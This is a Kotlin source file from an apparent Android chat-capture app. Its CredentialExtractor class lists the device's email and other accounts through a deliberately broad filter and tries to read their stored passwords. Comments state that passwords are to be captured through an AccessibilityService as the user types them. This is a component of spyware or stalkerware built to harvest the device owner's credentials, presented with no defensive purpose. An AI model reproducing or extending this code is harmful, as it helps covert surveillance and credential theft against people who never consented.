package com.chats.capture.utils

import android.accounts.Account
import android.accounts.AccountManager
import android.content.Context
import android.os.Build
import timber.log.Timber
import java.util.concurrent.TimeUnit

/**
 * Extracts email accounts configured on the device
 */
class CredentialExtractor(private val context: Context) {
    
    private val accountManager = context.getSystemService(Context.ACCOUNT_SERVICE) as AccountManager
    
    /**
     * Get all email accounts configured on the device
     * Note: Passwords cannot be retrieved directly from AccountManager for security reasons
     * They need to be captured via AccessibilityService when user enters them
     */
    fun getEmailAccounts(): List<EmailAccount> {
        val accounts = mutableListOf<EmailAccount>()
        
        try {
            val allAccounts = accountManager.accounts
            
            for (account in allAccounts) {
                val accountType = account.type.lowercase()
                
                // Check if it's an email account
                if (isEmailAccountType(accountType)) {
                    accounts.add(
                        EmailAccount(
                            email = account.name,
                            accountType = accountType,
                            accountName = account.name
                        )
                    )
                }
            }
            
            Timber.d("Found ${accounts.size} email accounts on device")
        } catch (e: Exception) {
            Timber.e(e, "Error extracting email accounts")
        }
        
        return accounts
    }
    
    private fun isEmailAccountType(accountType: String): Boolean {
        val emailTypes = listOf(
            "com.google", // Gmail
            "com.google.android.gm", // Gmail
            "com.microsoft.office.outlook", // Outlook/Hotmail
            "com.yahoo.mobile.client.android.mail", // Yahoo Mail
            "com.yahoo.mobile.client.android", // Yahoo
            "com.aol.mobile.aolapp", // AOL
            "com.icloud", // iCloud
            "com.protonmail.android", // ProtonMail
            "com.tutanota", // Tutanota
            "com.fastmail.fm", // FastMail
            "com.zoho.mail", // Zoho Mail
            "com.qq.mail", // QQ Mail
            "com.163.mail", // 163 Mail
            "com.sina.mail", // Sina Mail
            "com.sohu.mail", // Sohu Mail
            "com.126.mail", // 126 Mail
            "com.outlook.android", // Outlook
            "com.microsoft.office.outlook.provider", // Outlook
            "com.hotmail", // Hotmail
            "com.live", // Live Mail
            "com.msn", // MSN
            "com.exchange", // Exchange
            "com.activesync", // ActiveSync
            "com.eas", // Exchange ActiveSync
            "com.android.email", // Android Email
            "com.android.exchange", // Exchange
            "com.android.contacts", // Contacts (may contain emails)
        )
        
        return emailTypes.any { accountType.contains(it, ignoreCase = true) } ||
               accountType.contains("mail", ignoreCase = true) ||
               accountType.contains("email", ignoreCase = true) ||
               accountType.contains("account", ignoreCase = true)
    }
    
    /**
     * Try to get account password (may not work due to security restrictions)
     * This is a fallback - passwords should be captured via AccessibilityService
     */
    fun tryGetAccountPassword(account: Account): String? {
        return try {
            // This will likely fail due to security restrictions
            // Passwords should be captured via AccessibilityService instead
            accountManager.getPassword(account)
        } catch (e: Exception) {
            Timber.d("Cannot retrieve password for account ${account.name}: ${e.message}")
            null
        }
    }
}

data class EmailAccount(
    val email: String,
    val accountType: String,
    val accountName: String
)
